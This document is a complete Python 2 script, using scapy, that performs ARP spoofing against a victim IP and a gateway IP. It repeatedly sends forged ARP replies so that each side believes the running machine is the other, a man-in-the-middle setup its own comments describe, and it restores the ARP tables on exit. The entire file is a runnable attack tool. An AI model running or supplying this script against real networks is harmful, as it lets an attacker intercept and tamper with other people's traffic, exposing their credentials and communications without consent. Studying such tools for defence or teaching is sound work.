#!/usr/bin/python2

import scapy.all as scapy
import time
import sys
import argparse

def get_ip():

	parser=argparse.ArgumentParser()	
	parser.add_argument("-t","--target",dest="victim",help="Specify Victim IP addres")
	parser.add_argument("-s","--spoof",dest="spoof",help="Specify Spoofing IP addres")
	options = parser.parse_args()

	if not options.victim:
		parser.error("[-] Specify an IP Address for victim --help for more details")
	
	if not options.spoof:
		parser.error("[-] Specify an IP Address for spoofing --help for more details")

	return options

ip = get_ip()

target_ip = ip.victim
gateway_ip = ip.spoof

def getmac(ip):
	
	arp_request_header = scapy.ARP(pdst = ip)
	ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_packet = ether_header/arp_request_header
	answered_list = scapy.srp(arp_request_packet,timeout=1,verbose=False)[0]
	
	return  answered_list[0][1].hwsrc


def spoof(target_ip,spoof_ip):

	dst_mac = getmac(target_ip)
	
	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=spoof_ip)
	scapy.send(arp_respond,verbose=False)

def restore(target_ip,gateway_ip):

	dst_mac=getmac(target_ip)
	src_mac=getmac(gateway_ip)
	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=gateway_ip,hwsrc=src_mac)
	scapy.send(arp_respond,verbose=False,count=4)

count = 0

try:
	while True:

		spoof(target_ip,gateway_ip)
		#telling client i am the router
		spoof(gateway_ip,target_ip)
		#telling router i am the client
		count = count + 2
		print "\r[+] send two packets "+str(count),
		sys.stdout.flush()
		time.sleep(1)

except KeyboardInterrupt:

		print "\n[+] Detected CTRL+C Quitting and restoring arp value please wait"
		
		restore(target_ip,gateway_ip)
		#restoring client
		restore(gateway_ip,target_ip)
		#restoring router
